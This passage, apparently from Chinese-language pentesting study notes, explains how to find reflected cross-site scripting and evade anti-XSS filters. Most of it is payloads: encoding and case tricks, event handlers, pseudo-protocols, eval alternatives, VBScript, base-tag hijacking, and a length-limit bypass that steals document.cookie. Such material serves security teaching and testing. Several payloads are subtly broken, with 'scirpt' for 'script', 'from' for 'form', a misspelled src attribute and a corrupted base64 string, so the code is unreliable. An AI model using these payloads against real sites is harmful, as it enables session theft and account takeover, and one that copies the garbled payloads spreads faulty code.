+<li>许多应用程序实施的防XSS过滤存在缺陷，可以通过各种方法避开。例如，假设在处理用户输入之前，应用程序删除其中出现的所有&lt; script&gt;标签，这意味着基本方法中使用的攻击字符串将不会在应用程序的响应中返回。但是，可以对&lt; scirpt&gt;进行处理，成功利用XSS漏洞:<pre class=" language-bash"><code class="language-bash"><span class="token string">">&lt;scirpt >
+"</span><span class="token operator">></span><span class="token operator">&lt;</span>ScRiPt<span class="token operator">></span>
+<span class="token string">"%3e%3ccscipt%3e
+"</span><span class="token operator">></span>scr<span class="token operator">&lt;</span>scirpt<span class="token operator">></span>ipt<span class="token operator">></span>
+%00"<span class="token operator">></span><span class="token operator">&lt;</span>scirpt<span class="token operator">></span></code></pre>
+</li>
+</ul>
+<blockquote>
+<p>注：当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器DOM中，并可被客户端JavaScript访问。在这种情况下，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
+</blockquote>
+<h3 id="查找并利用反射型XSS漏洞"><a href="#查找并利用反射型XSS漏洞" class="headerlink" title="查找并利用反射型XSS漏洞"></a>查找并利用反射型XSS漏洞</h3><p>要探查XSS漏洞，最可靠的方法是系统性地检查在解析应用程序过程中确定的所有用户的输入进入点，并遵循以下步骤：</p>
+<ul>
+<li>在每个进入点提交一个良性字符串</li>
+<li>确定此字符串“反射”在应用程序响应中的所有位置</li>
+<li>对于每个反射，确定显示反射型数据时的语法上下文</li>
+<li>提交针对反射的语法上下文而修改的数据，尝试在响应中引入任意脚本</li>
+<li>如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤</li>
+</ul>
+<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>检测反射型XSS漏洞的最可靠方法的初始步骤与前面的基本方法类似。</p>
+<h4 id="测试引入脚本的反射"><a href="#测试引入脚本的反射" class="headerlink" title="测试引入脚本的反射"></a>测试引入脚本的反射</h4><p>渗透测试员必须手动检查已确定的每一个反射型输入实例，以核实其是否确实可被利用，在响应中包含反射型数据的每个位置，都需要确认该数据的语法特点。这时，渗透测试员必须找到某种修改输入的方法，以便在将输入复制到应用程序响应中的相同位置时，任何脚本都能够得以执行。</p>
+<blockquote>
+<p>注：测试员必须对请求中出现的任何特殊字符进行URL编码，包括&amp;=+；和空格</p>
+</blockquote>
+<h4 id="检查防御性过滤"><a href="#检查防御性过滤" class="headerlink" title="检查防御性过滤"></a>检查防御性过滤</h4><p>通常情况下，最初提交的攻击字符串并不被服务器按原样返回，因而无法成功执行注入的JavaScript。如果是这样接下来应该确定服务器对输入进行了哪些处理。主要有以下3种可能：</p>
+<ol>
+<li>应用程序或Web应用程序防火墙保护的应用程序发现了一个攻击签名，完全阻止了输入。</li>
+<li>应用程序已经接受了输入，但对攻击字符串进行了某种编码或净化。</li>
+<li>应用程序把攻击字符串截短至某个固定的最大长度。</li>
+</ol>
+<h4 id="避开基于签名的过滤"><a href="#避开基于签名的过滤" class="headerlink" title="避开基于签名的过滤"></a>避开基于签名的过滤</h4><p>在第一种类型的过滤中，应用程序通常会对攻击字符串做出与无害字符串截然不同的响应。如果发生了这种情况，那么接下来，应该确定输入的字符或表达式触发了过滤。一种有效的方法是轮流删除字符串的不同部分，看输入是否仍然被阻止。</p>
+<p>有各种方法可以在HTML页面中引入脚本代码，这些方法通常能够避开基于签名的过滤。因此，测试员要么找到引入脚本的其他方法，要么使用浏览器接受的略显畸形的语法。下面，将介绍各种执行脚本的不同方法，然后说明一系列可用于避开常用过滤的技巧</p>
+<h5 id="引入脚本代码的方法"><a href="#引入脚本代码的方法" class="headerlink" title="引入脚本代码的方法"></a>引入脚本代码的方法</h5><p>有4种不同的方法可用于在HTML页面中引入脚本代码。</p>
+<h5 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h5><p>除直接使用&lt; script&gt;标签外，还可以通过各种方法、使用复杂的语法来隐藏标签，从而避开某些过滤：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html,&lt;script>alert(1)&lt;/script>"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span></code></pre>
+<p>上例中基于Base64的字符串为：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<ol>
+<li><p>事件处理器<br>有大量的事件处理器可与各种标签结合使用，以用于执行脚本。HTML5使用事件处理器提供了大量向量。这包括使用autofocus属性自动触发之前需要用户交互的事件：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input autofocus onfocus<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input onblur<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> autofocus<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span>
+<span class="token operator">&lt;</span>body onscroll<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span></code></pre>
+<p>它允许在结束标签中使用事件处理器：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>/a onmouseover<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+<p>最后，HTML5还通过事件处理器引入了新标签：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>video src<span class="token operator">=</span>1 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>audio src<span class="token operator">=</span>1 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+</li>
+<li><p>脚本伪协议<br>脚本伪协议可用在各种位置，以便于在需要URL的属性中执行行内脚本。以下是一些示例：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>object data<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>embed src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+<p>虽然上述示例使用的是javascript伪协议，但是，还可以在Internet Explorer上使用vbs协议。<br>和事件处理器一样，HTML5也提供一些在XSS攻击使用脚本伪协议的新方法：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>from id<span class="token operator">=</span>test /<span class="token operator">></span><span class="token operator">&lt;</span>button from<span class="token operator">=</span>test formaction<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>event-source src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+<p>在针对输入过滤进行攻击时，新的event-source标签特别有用。与之前的任何HTML5标签不同，它的名称中包含一个连字符，因此，使用这个标签可以避开传统的、认为只有标签名称只能包含字母的基于正则表达式的过滤</p>
+</li>
+<li><p>动态求值的样式<br>一些浏览器支持在动态求值的CSS样式中使用JavaScript。以下示例在IE7及更早版本上执行，如果在兼容模式下运行，还可以在后续版本上执行：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x style<span class="token operator">=</span>x:expression<span class="token punctuation">(</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">))</span><span class="token operator">></span></code></pre>
+<p>最新版本的IE不再支持上述语法，因为这些语法只能用在XSS攻击中，但是，在最新版本的IE中，使用以下请求可以达到相同的效果：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x style<span class="token operator">=</span>behavior:url<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#default#time2) onbegin=alert(1)></span></code></pre>
+<p>使用Firefox浏览器可以使用moz-bingding属性实施基于CSS的攻击，但是，由于应用程序已经这一功能实施了限制，现在无法再通过它来进行XSS攻击。</p>
+</li>
+<li><p>避开过滤：HTML<br>旨在阻止XSS攻击的基于签名的过滤通常采用正则表达式或其他技巧来确定关键的HTML组件，如标签括号、标签名称、属性名称和属性值。通过一种或多种浏览器接受的方式在HTML中的关键位置插入不常见的字符，可以避开其中的许多过滤</p>
+</li>
+<li><p>标签名称<br>从起始标签名称开始，只需改变所使用字符的大小写，即可避开最简单的过滤。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iMg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+<p>更进一步，可以在任意位置插入NULL字节:</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token punctuation">[</span>%00<span class="token punctuation">]</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>i<span class="token punctuation">[</span>%00<span class="token punctuation">]</span>mg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+<p>[%XX]表示十六进制ASCII代码XX的原义字符。在向应用程序实施攻击时，通常会使用字符的URL编码形式。</p>
+</li>
+</ol>
+<p>有时可以使用任意标签名引入事件处理器，从而避开仅仅阻止特定标签名称的过滤：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x onclick<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span>Click here<span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre>
+<p>有时，可以引入不同名称的新标签，但却找不到使用这些标签直接执行代码的方法。在这些情况下，可以使用一种被称为”基本标签劫持”的技巧来实施攻击。&lt; base&gt;标签用于指定一个URL，浏览器应使用该URL解析随后在页面中出现的任何相对URL。如果可以引入一个新的&lt; base&gt;,并且页面执行反射点后的任何使用相对URL的&lt; script&gt;，则你就可以指定一个指向受你控制的服务器的基本URL。当浏览器加载在HTML页面的剩余部分指定的脚本时，这些脚本将从指定的服务器加载，但仍然能够在调用它们的页面中执行。</p>
+<ol start="6">
+<li><p>属性名称<br>可以在属性名称中使用上述NULL字节技巧。这样做可以避免许多试图通过阻止以on开头的属性名称来阻止事件过滤器的简单过滤。</p>
+</li>
+<li><p>属性分隔符<br>属性可以选择使用双引号、单引号或空格进行分隔，或在IE上使用重音符分隔：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span>scr<span class="token operator">=</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">'alert(1)'</span>src<span class="token operator">=</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token variable">`</span></span>src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+<p>如果过滤器不知道重音符被用作属性分隔符，它会将下面的示例看作仅包含一个属性，其名称不再为事件处理器的名称：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>a<span class="token variable">`</span></span>onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+<p>通过使用引号分隔的属性，并在标签名后插入异常的字符，就可以设计出不需要任何空格的攻击，从而避开一些过滤:</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img/onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span>src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+</li>
+<li><p>属性值<br>在属性值中，可以使用NULL字节技巧。还可以使用HTML编码的字符，如下所示:</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>a<span class="token punctuation">[</span>%00<span class="token punctuation">]</span>lert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>a<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#x6c;ert(1) src=a></span></code></pre>
+</li>
+</ol>
+<p>在进一步处理属性值时，浏览器会对其进行HTML编码，因此，可以使用HTML编码对脚本代码进行模糊处理，从而避开任何过滤。<br>在使用HTML编码时，应注意到，浏览器接受规范的各种变体，甚至可能忽略过滤器“意识到”的HTML编码问题。可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾分号。</p>
+<ol start="9">
+<li>标签括号<br>有时，通过利用奇怪的应用程序或浏览器行为，甚至可以使用无效的标签括号，并且使浏览器按攻击所需的方式处理相关标签。<br>一些应用程序在应用输入后还执行不必要的URL解码，因此，请求中的以下输入：<pre class=" language-bash"><code class="language-bash">%253cimg%20onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span>%20src<span class="token operator">=</span>a%253e</code></pre>
+被应用程序服务器进行URL解码，然后将以下输入传递给应用程序：<pre class=" language-bash"><code class="language-bash">%3cimg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a%3e</code></pre>
+其中不包含任何标签括号，因此不会被输入过滤阻止，但是，应用程序会进行第二次解码。因此输入变成：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+该输入会回显给用户，导致攻击得以实施。</li>
+</ol>
+<p>如果应用程序框架基于字形和发音的相似性，将不常见的Unicode字符”转换”为它们最接近的ASCII字符，这时可能会出现与上述示例类似的情况。如，以下输入使用Unicode双角号(%u00AB和%u00BB),而不是标签括号</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">>></span></code></pre>
+<p>应用程序的输入过滤可能会允许该输入，因为其中不包括任何有问题的HTML。但是，如果应用程序框架在输入被插入到响应中时将引号转换为标签字符，攻击将取得成功。事实证明，大量应用程序都易于受到这些攻击。</p>
+<p>一些输入过滤通过简单地匹配起始和结束尖括号，提取内容，并将其与标签名称黑名单进行比较来识别HTML标签。在这种情况下，可以通过使用多余的括号(如果浏览器接受)来避开过滤</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>//<span class="token operator">&lt;&lt;</span>/scrip</code></pre>
+<ol start="10">
+<li>字符集<br>可以使用非标准编码表示法致使应用程序接受攻击有效载荷的非标准编码，从而避开各种类型的过滤。如下是一些非标准编码</li>
+</ol>
+<ul>
+<li>UTF-7</li>
+<li>US-ASCII</li>
+<li>UTF-16<br>这些编码后的字符串可避开许多常见的反XSS过滤，实施成功攻击的挑战在于如何使浏览器使用所需的字符集来解释响应。如果你控制了HTTP Content-Type 消息头或其对应的HTML元标签，就可以使非标准字符集避开过滤，使浏览器按照需要的方式解释有效载荷。一些应用程序在某些请求中提交charset参数，允许直接设置在应用程序的响应中使用的字符集。</li>
+</ul>
+<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>和使用HTML对攻击进行模糊处理一样，也可以通过各种技巧来修改所需的脚本代码，以避开常见的输入过滤。</p>
+<ol>
+<li><p>使用JavaScript转义<br>JavaScript允许各种字符转义，可以通过这种方式避免包含原义格式的表达式。<br>Unicode转义可用于表示JavaScript关键字中的字符，从而避开许多类型的过滤。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>a\u006cert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>如果能够使用eval命令，就可以将其他命令以字符串形式传送给eval命令，从而执行这些命令。在JavaScript中，可以使用Unicode转义、十六进制转义和八进制转义：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\x6cert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\154ert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>此外，字符串中的多余转义字符被忽略：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\1\ert\(1\)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+</li>
+<li><p>动态构建字符串</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'al'</span>+<span class="token string">'ert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>String.fromCharCode<span class="token punctuation">(</span>97,108,101,114,116,40,49,41<span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">'amF2YXNjcmlwdDphnGVydCgKQ'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>上面的示例可以在Firefox上执行，可以通过它解码Base64编码的命令，然后将其传递给eval.</p>
+</li>
+<li><p>替代eval方法<br>如果无法直接调用eval命令，可以通过其他方法以字符串格式执行命令。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token string">'alert(1)'</span>.replace<span class="token punctuation">(</span>/.+/,eval<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>function::<span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+</li>
+<li><p>替代圆点<br>如果圆点被阻止，可以使用下列方法解决：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>with<span class="token punctuation">(</span>document<span class="token punctuation">)</span>alert<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+</li>
+<li><p>组合多种技巧<br>在HTML标签属性中使用JavaScript(通过事件处理器、脚本伪协议或动态求值的样式)的情况下，可以将这些技巧与HTML编码组合使用。</p>
+</li>
+<li><p>使用VBScript<br>常见的XSS主要通过JavaScript来实施，但是，在Internet Explorer上，可以使用VBScript语言。该语言使用不同的语法和其他属性。可以通过各种方式插入VBScript代码，如：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script language<span class="token operator">=</span>vbs<span class="token operator">></span>MsgBox 1<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">"vbs:MsgBox 1"</span> src<span class="token operator">=</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>MsgBox+1 language<span class="token operator">=</span>vbs src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>
+<p>无论哪种情况，都可以使用vbscript(而不是vbs)来指定语言。请注意，最后一个示例使用了MsgBox+1，以避免使用空白符，因而不需要在属性值周围加上引号。这样做之所以可行，是因为+1有效地给“空白”加上了数字1，因此表达式求值的结果为1；随后，这一结果被传递给MsgBox函数</p>
+</li>
+</ol>
+<ul>
+<li>在VBScript中，一些函数无须括号即可调用</li>
+<li>与JavaScript不同，VBScript不区分大小写</li>
+</ul>
+<ol start="6">
+<li><p>组合JavaScript和VBScript<br>为避开某些过滤，可以从JavaScript中调用VBScript，或在VBScript中调用JavaScript。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>scirpt<span class="token operator">></span>execScript<span class="token punctuation">(</span><span class="token string">"MsgBox 1 "</span>,<span class="token string">"vbscript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script language<span class="token operator">=</span>vbs<span class="token operator">></span>execScript<span class="token punctuation">(</span><span class="token string">"alert(1)"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>VBScript不区分大小写，即使输入被转换为大写，你的代码仍然可以执行。在这些情况下，如果你确实希望调用JavaScript函数，可以使用VBScript中的字符串操纵函数用所需的大小写构建一个命令，并用JavaScript使用该命令</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>SCRIPT LANGUAGE<span class="token operator">=</span>VBS<span class="token operator">></span>EXECSCRIPT<span class="token punctuation">(</span>LCASE<span class="token punctuation">(</span><span class="token string">"ALERT(1)"</span><span class="token punctuation">))</span><span class="token operator">&lt;</span>/SCRIPT<span class="token operator">></span>
+<span class="token operator">&lt;</span>IMG ONERROR<span class="token operator">=</span><span class="token string">"VBS:EXECSCRIPT LCASE('ALERT(1)')"</span> SRC<span class="token operator">=</span>A<span class="token operator">></span></code></pre>
+</li>
+<li><p>使用经过编码的脚本<br>使用各种工具和网站对自己的脚本进行编码，以用于实施攻击。</p>
+</li>
+</ol>
+<h5 id="避开净化"><a href="#避开净化" class="headerlink" title="避开净化"></a>避开净化</h5><p>应用程序对攻击字符串执行某种净化或编码，使其变得无害，防止它执行JavaScript。如果遇到这种防御，首先应查明应用程序净化哪些字符与表达式，以及是否仍然可以通过剩下的字符进行攻击。</p>
+<h5 id="突破长度限制"><a href="#突破长度限制" class="headerlink" title="突破长度限制"></a>突破长度限制</h5><p>当应用程序把输入截短为一个固定的最大长度时，有三种建立攻击字符串的方法。</p>
+<ol>
+<li><p>第一种方法是尝试使用最短可能长度的JavaScriptAPI，删除那些通常包含在内但并不完全必要的字符，缩短攻击的有效载荷(可以使用Dean Edward的JavaScript packer工具删除不必要的空白符，尽可能缩短某一段脚本；或将脚本转换为单独一行，方便插入到一个请求参数中)。</p>
+</li>
+<li><p>第二种方法是将一个攻击有效载荷分布到几个不同的位置，用户控制的输入在这里插入到同一个返回页面中。以下面URL为例：</p>
+<pre class=" language-bash"><code class="language-bash">https://wahh-app.com/account.php?page_id<span class="token operator">=</span>244<span class="token operator">&amp;</span>seed<span class="token operator">=</span>129402931<span class="token operator">&amp;</span>mode<span class="token operator">=</span>normal</code></pre>
+<p>它返回一个包含以下内容的页面：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">"224"</span><span class="token operator">></span>   //限制长度
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"seed"</span> value<span class="token operator">=</span><span class="token string">"129402931"</span><span class="token operator">></span>   //限制长度
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"mode"</span> value<span class="token operator">=</span><span class="token string">"normal"</span><span class="token operator">></span>     //限制长度</code></pre>
+<p>假设应用程序对每个字段实施了长度限制，以阻止在其中插入有效的攻击字符串。但是攻击者可以使用下面的URL将一段脚本分布到他所控制的三个位置，从而传送一个有效的字符串：</p>
+<pre class=" language-bash"><code class="language-bash">https://wahh-app.com/account.php?page_id<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>/*<span class="token operator">&amp;</span>seed<span class="token operator">=</span>*/alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>/*<span class="token operator">&amp;</span>mode<span class="token operator">=</span>*/<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>这个URL参数值植入到页面后，生成如下脚本：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>/*<span class="token string">">
+&lt;input type="</span>hidden<span class="token string">" name="</span>seed<span class="token string">" value="</span>*/alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>/*<span class="token string">">
+&lt;input type="</span>hidden<span class="token string">" name="</span>mode<span class="token string">" value="</span>*/<span class="token operator">&lt;</span>/script<span class="token operator">></span>"<span class="token operator">></span></code></pre>
+<p>最终的HTML完全有效，其中的源代码块已经称为JavaScript注释(包含在/* 与 * /之间)，因此被浏览器忽略。最后执行的部分为：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+</li>
+<li><p>第三种是将一个反射型XSS漏洞“转换成”一个基于DOM的漏洞。例如，在最初的反射型XSS漏洞中，如果应用程序对复制到返回页面中的message参数设置长度限制，那么就可以注入以下45字节的漏洞，它对当前URL中的片断字符串求值。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>location.hash.slice<span class="token punctuation">(</span>1<span class="token punctuation">))</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>通过在易于受到反射型XSS攻击的参数中注入这段脚本，就可以在生成的页面中造成一个基于DOM的XSS漏洞，从而执行位于片段字符串中的另一段脚本，它不受应用程序过滤的影响。可为任意长度：</p>
+<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/5/Error.ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>unescape<span class="token punctuation">(</span>location<span class="token punctuation">))</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token comment" spellcheck="true">#%0Aalert('long script here.......')</span></code></pre>
+<p>在这个版本中，整个URL经过URL解码，然后传递给eval命令。整个URL将做为有效的JavaScript执行，因为http:协议前缀作为代码标签，协议前缀后面的//则作为单行注释，%0A经过URL解码后将变为换行符，表示注释结束。</p>
+</li>
+</ol>
+<h5 id="实施有效的XSS攻击"><a href="#实施有效的XSS攻击" class="headerlink" title="实施有效的XSS攻击"></a>实施有效的XSS攻击</h5><p>下面是实施有效的XSS攻击时可能遇到的各种挑战及如何应对这些挑战。</p>
+<ol>
